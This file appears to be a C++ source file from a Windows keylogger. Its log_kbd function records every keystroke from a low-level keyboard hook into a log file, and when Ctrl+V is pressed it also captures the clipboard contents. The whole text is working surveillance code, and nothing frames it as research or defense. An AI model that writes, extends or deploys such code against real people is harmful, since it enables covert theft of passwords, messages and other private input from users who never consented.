#include "util/clipboard.hpp"
#include "util/keyboard.hpp"
#include "configuration.hpp"
#include "constants.hpp"
#include "keylogger.hpp"

// Logs the respective characters of the provided KBD hook.
void keylogger::log_kbd(const KBDLLHOOKSTRUCT& kbd_hook) {
	if (configuration::ignored_key_codes.count(kbd_hook.vkCode))
		return;

	static std::wofstream out_file{ configuration::out_file.data(), std::wofstream::app };

	const auto it = configuration::key_codes.find(kbd_hook.vkCode);

	if (it != configuration::key_codes.end()) {
		out_file << it->second;
	} else if (keyboard_util::is_down(VK_CONTROL)) {
		out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook.vkCode) << L']';

		if (kbd_hook.vkCode == constants::vk_v) {
			const auto data = clipboard_util::get_data();

			if (data.has_value())
				out_file << data.value();
		}
			
	} else {
		out_file << keyboard_util::kbd_to_unicode(kbd_hook);
	}

	out_file << std::flush;
}
